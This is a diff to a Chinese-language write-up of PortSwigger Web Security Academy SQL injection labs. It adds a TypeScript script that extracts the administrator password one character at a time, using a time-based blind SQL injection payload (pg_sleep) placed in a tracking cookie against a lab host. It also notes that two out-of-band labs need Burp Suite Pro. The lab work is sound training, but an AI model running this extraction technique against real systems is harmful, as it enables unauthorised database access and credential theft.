@@ -550,7 +550,48 @@ SELECT * FROM tracking WHERE id = '' OR (SELECT CASE WHEN SUBSTRING((SELECT pass
 稍微修改 [Lab: Blind SQL injection with conditional errors](#lab-blind-sql-injection-with-conditional-errors) 的 NodeJS 程式碼
 
 ```ts
-
+async function Blind_SQL_injection_with_time_delays_and_information_retrieval() {
+  const config = {
+    session: "o2anaO8pgQrKwriqAe5KQA1oXfkaAIol",
+    url: "https://0acd00a6044b2fe980f6f325009d002b.web-security-academy.net/",
+    passwordLength: 20,
+    sleepSeconds: 5,
+  };
+  const password: string[] = [];
+  for (let i = 0; i < config.passwordLength; i++) {
+    for (const passwordChar of passwordChars) {
+      console.log({ i, passwordChar });
+      const timeStart = new Date().getTime();
+      await fetch(config.url, {
+        headers: {
+          cookie: `session=${config.session}; TrackingId=' OR (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${i + 1}, 1) = '${passwordChar}' THEN pg_sleep(${config.sleepSeconds}) ELSE pg_sleep(0) END) IS NULL--`,
+        },
+      });
+      const timeEnd = new Date().getTime();
+      if (timeEnd - timeStart > config.sleepSeconds * 1000) {
+        console.log(`find password position ${i + 1}: ${passwordChar}`);
+        password[i] = passwordChar;
+        break;
+      }
+    }
+  }
+  console.log("result");
+  console.log(password.join(""));
+}
 ```
 
+### Lab: Blind SQL injection with out-of-band interaction
+
+這題需要 Burp Suite Pro，暫時無法解
+
+<!-- todo-yus 等買了 burp suite pro 再來解題 -->
+
+### Lab: Blind SQL injection with out-of-band data exfiltration
+
+這題需要 Burp Suite Pro，暫時無法解
+
+<!-- todo-yus 等買了 burp suite pro 再來解題 -->
+
 ## 參考資料
+
+- https://portswigger.net/web-security/sql-injection
